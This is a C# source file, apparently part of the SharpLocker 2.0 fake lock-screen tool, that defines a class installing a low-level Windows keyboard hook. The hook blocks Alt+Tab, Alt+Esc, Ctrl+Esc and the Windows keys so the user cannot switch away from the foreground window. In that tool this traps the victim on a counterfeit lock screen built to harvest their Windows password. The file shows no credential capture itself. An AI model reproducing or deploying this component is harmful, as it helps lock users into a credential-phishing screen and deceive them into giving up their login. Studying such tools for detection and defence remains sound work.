using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SharpLocker_2._0.Classes
{
    /// <summary>
    /// This class is responsible for intercepting certain key combinations
    /// like Alt + Tab or Ctrl + Esc
    /// </summary>
    public static class KeyPressHandler
    {
        private delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
        private static LowLevelKeyboardProcDelegate @delegate;

        [DllImport("user32.dll", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi)]
        private static extern int SetWindowsHookEx(
           int idHook,
           LowLevelKeyboardProcDelegate lpfn,
           int hMod,
           int dwThreadId);

        [DllImport("user32.dll")]
        private static extern int UnhookWindowsHookEx(int hHook);


        [DllImport("user32.dll", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi)]
        private static extern int CallNextHookEx(
            int hHook, int nCode,
            int wParam, ref KBDLLHOOKSTRUCT lParam);


        static readonly int WH_KEYBOARD_LL = 13;
        private static int intLLKey;
        private static KBDLLHOOKSTRUCT lParam;


        private struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            int scanCode;
            public int flags;
            int time;
            int dwExtraInfo;
        }

        /// <summary>
        /// Triggers when a key has been pressed.
        /// If any of the key combinations listed below are pressed, they will be ignored
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private static int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
        {
            bool deny = false;
            switch (wParam)
            {
                case 256:
                case 257:
                case 260:
                case 261:
                    //Alt+Tab, Alt+Esc, Ctrl+Esc, Windows Key
                    if (((lParam.vkCode == 9) && (lParam.flags == 32)) ||
                    ((lParam.vkCode == 27) && (lParam.flags == 32)) || ((lParam.vkCode ==
                    27) && (lParam.flags == 0)) || ((lParam.vkCode == 91) && (lParam.flags
                    == 1)) || ((lParam.vkCode == 92) && (lParam.flags == 1)) || ((true) &&
                    (lParam.flags == 32)))
                    {
                        deny= true;
                    }
                    break;
            }

            if (deny)
                return 1;
            else return CallNextHookEx(0, nCode, wParam, ref lParam);
        }

        // Disable key combinations
        public static void Disable()
        {
            intLLKey =
                SetWindowsHookEx(

                WH_KEYBOARD_LL,

                @delegate = new LowLevelKeyboardProcDelegate(LowLevelKeyboardProc),

                Marshal.GetHINSTANCE(
                  System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
        }

        // enable key combinations
        public static void Enable()
        {
            intLLKey = UnhookWindowsHookEx(intLLKey);
            @delegate = null;
        }
    }
}
